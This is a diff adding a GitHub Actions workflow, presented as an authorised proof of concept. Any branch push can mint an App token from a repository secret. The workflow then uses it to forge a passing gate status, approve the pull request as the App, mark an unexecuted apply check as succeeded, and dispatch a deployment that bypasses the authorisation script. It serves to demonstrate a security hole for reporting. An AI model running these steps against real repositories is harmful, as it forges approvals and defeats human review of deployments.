@@ -1,0 +1,76 @@
+name: PROBE key exposure (authorised)
+# AUTHORISED SECURITY PROOF for shipmate PR #101. This workflow exists to
+# demonstrate that a repository secret is readable by a branch-authored
+# workflow. It prints metadata only — never the key, never the token.
+# Delete this branch when the proof is recorded.
+on: push
+permissions: {}
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint an App installation token from the repository secret
+        id: token
+        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
+        with:
+          client-id: ${{ vars.SHIPMATE_APP_ID }}
+          private-key: ${{ secrets.SHIPMATE_APP_PRIVATE_KEY }}
+
+      - name: (a) Prove the token is a real App identity
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+        run: |
+          set -euo pipefail
+          echo "acting as:"
+          gh api /installation/repositories --jq '.repositories[].full_name'
+
+      - name: (b) Post a success shipmate / gate status
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          gh api -X POST "repos/$GITHUB_REPOSITORY/statuses/$SHA" \
+            -f state=success -f context='shipmate / gate' \
+            -f description='PROBE: forged gate, no plan was applied' \
+            --jq '"gate written by: \(.creator.login)"'
+
+      - name: (c) Approve the pull request as the App
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+          PR: ${{ github.event.inputs.pr || '' }}
+        run: |
+          set -euo pipefail
+          n=$(gh api "repos/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/pulls" --jq '.[0].number')
+          gh api -X POST "repos/$GITHUB_REPOSITORY/pulls/$n/reviews" \
+            -f event=APPROVE -f body='PROBE: approving review submitted by an App token' \
+            --jq '"approved by: \(.user.login) (\(.user.type))"'
+
+      - name: (d) Complete an apply check for an apply that never ran
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+        run: |
+          set -euo pipefail
+          id=$(gh api "repos/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/check-runs?filter=all&per_page=100" \
+                 --jq '[.check_runs[] | select((.name | startswith("apply / ")) and .status != "completed")][0].id // empty')
+          if [ -z "$id" ]; then echo "::error::no pending apply check found — re-run after the plan completes"; exit 1; fi
+          gh api -X PATCH "repos/$GITHUB_REPOSITORY/check-runs/$id" \
+            -f status=completed -f conclusion=success \
+            -f 'output[title]=PROBE: marked applied without applying' \
+            -f 'output[summary]=No apply ran. This check was completed by a branch-authored workflow.' \
+            --jq '"completed check \(.id) (\(.name)) as \(.app.slug)"'
+
+      - name: (e) Dispatch an apply, bypassing scripts/authorize
+        env:
+          GH_TOKEN: ${{ steps.token.outputs.token }}
+        run: |
+          set -euo pipefail
+          # Deliberately bogus plan_run_id: the run must start (proving authorize
+          # was never consulted) and then fail fast without applying anything.
+          gh api -X POST "repos/$GITHUB_REPOSITORY/actions/workflows/apply.yml/dispatches" \
+            -f ref=main \
+            -f 'inputs[environment]=dev-eu' \
+            -f "inputs[ref]=$GITHUB_SHA" \
+            -f 'inputs[pr_number]=0' \
+            -f 'inputs[plan_run_id]=1' \
+          && echo "dispatch accepted — scripts/authorize was never consulted"
